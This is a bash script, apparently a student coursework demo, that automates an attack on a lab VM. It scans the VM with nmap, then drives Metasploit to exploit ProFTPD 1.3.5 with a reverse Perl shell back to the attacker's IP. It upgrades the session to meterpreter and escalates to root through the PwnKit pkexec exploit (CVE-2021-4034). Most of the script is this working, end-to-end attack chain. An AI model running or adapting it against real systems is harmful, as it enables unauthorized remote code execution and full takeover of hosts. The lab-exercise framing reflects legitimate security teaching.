#!/bin/bash

#get the ip address
#vm name = cmm518coursework2021
ip=$(VBoxManage guestproperty enumerate cmm518coursework2021 | grep /Net/0/V4/IP | awk '{print $4}' | tr -d ',')

#banner and Introduction
RED="\e[34m"
MAGENTA="\e[95m"
GREEN="\e[92m"
CYAN="\e[96m"
ENDCOLOR="\e[0m"
clear
echo -e " ${RED}#
 #####                                           #####
#     #  #####    ####   #    #  #####          #     #
#        #    #  #    #  #    #  #    #               #  ${MAGENTA}
#  ####  #    #  #    #  #    #  #    #          #####
#     #  #####   #    #  #    #  #####          #       
#     #  #   #   #    #  #    #  #              #         ${CYAN}
 #####   #    #   ####    ####   #              #######

"

sleep 0.4
printf "${GREEN}Topic : Writing a bashscript to get RCE on a vulnerable machine ${ENDCOLOR}\n\n"
sleep 0.4
echo "Group Members:
1) Ruth Chikezie - Introduction"
sleep 0.4
echo "2) Chungu Zulu - Enumeration phase "
sleep 0.4
echo "3) Beloved Etete- Initial Access "
sleep 0.4
echo "4) Catherine Kamau - Privilege Escalation"
sleep 0.4
echo "5) Chimeziri Iwuoha - Recommendation and conclutions"
sleep 0.4
printf "\nLet's begin:"
printf "\n${GREEN}THE RECON STAGE${ENDCOLOR}\n"


#Run Nmap to find open ports and the services running in the ip address
printf "\n${CYAN}--------RUNNING NMAP---------${ENDCOLOR}\n\n" > results

printf "\n${MAGENTA}Running nmap...${ENDCOLOR}\n"
nmap -T4 -p21,22,80,445,631,3500,8181,6697 -sC -sV -oN results.txt $ip  | tail -n +5 | head -n -3 >> results

#Record the open ports
open_ports=$(awk -F'/' '/open/{print $1}' results.txt > ports.txt)
printf "\n${CYAN}--------OPEN PORTS-----${ENDCOLOR}\n\n" >> results
cat ports.txt >> results

#get the services running on the ports
printf "\n${CYAN}--------SERVICES RUNNING-------${ENDCOLOR}\n" >> results
services=$(awk '/open/ {print $3}' results.txt > services.txt)
cat services.txt >> results

# get http ports only
awk '/open/{print $0}' results.txt | awk -F/ '/http/{print $1}' > httpports.txt
httports=$(cat httpports.txt)

cat results
printf "${CYAN}\n-----RECON COMPLETE-----\n\n${ENDCOLOR}"

# get my local ip
myip=$(hostname -I | awk '{print $1}')
printf "${GREEN}\n------EXPLOITATION STARTED-----\n\n${ENDCOLOR}"

#initialize metasploit database
printf "\n${MAGENTA}Initializing metasploit database.....${ENDCOLOR}\n"
yes n | msfdb --use-defaults init 
printf "\n${MAGENTA}Database initialized${ENDCOLOR}\n"

#metasploit commands
msfconsole -q -x "search ProFTPD 1.3.5;info 0;use 0;set RHOSTS $ip; set payload cmd/unix/reverse_perl; set SITEPATH /var/www/html; set LHOST $myip; echo '${MAGENTA}Achieving Initial Access${ENDCOLOR}';exploit -z; echo '${MAGENTA}Upgrading the shell to meterpreter${ENDCOLOR}';sessions -u 1; echo '${MAGENTA}Looking for a privilege Vector${ENDCOLOR}';use post/multi/recon/local_exploit_suggester; set session 2; run; echo '${MAGENTA}Privilege Escalation Starting${ENDCOLOR}';use exploit/linux/local/cve_2021_4034_pwnkit_lpe_pkexec; set LPORT 9999; set session 2; exploit;"

#Conclusions
printf "\n\n\n${MAGENTA}Thank you for Being an amazing Audience. The script can be found on Our github Page feel free to Look at it and Leave comments and feedback${ENDCOLOR}\n\n"
banner "The End!!"
